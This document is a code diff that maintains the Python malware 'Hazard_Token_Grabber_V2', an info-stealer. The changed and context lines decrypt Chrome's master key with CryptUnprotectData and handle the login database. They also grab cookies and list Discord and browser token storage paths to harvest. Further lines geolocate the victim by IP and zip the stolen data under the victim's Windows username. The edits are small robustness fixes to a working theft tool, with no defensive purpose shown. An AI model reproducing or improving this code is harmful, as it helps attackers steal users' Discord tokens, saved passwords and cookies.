@@ -85,9 +85,10 @@ class Hazard_Token_Grabber_V2:
             f.write(content2)
 
     def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
+        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
+
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
@@ -138,7 +139,7 @@ class Hazard_Token_Grabber_V2:
         try:
             os.remove("Loginvault.db")
         except:
-            pass  
+            pass
 
     def grabCookies(self):
         master_key = self.get_master_key()
@@ -180,22 +181,10 @@ class Hazard_Token_Grabber_V2:
             'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
             'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
             'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
             'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
 
         for source, path in paths.items():
@@ -271,7 +260,7 @@ class Hazard_Token_Grabber_V2:
             country = data['country']
             region = data['region']
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
-        except:
+        except Exception:
             pass
         temp = os.path.join(self.tempfolder)
         new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
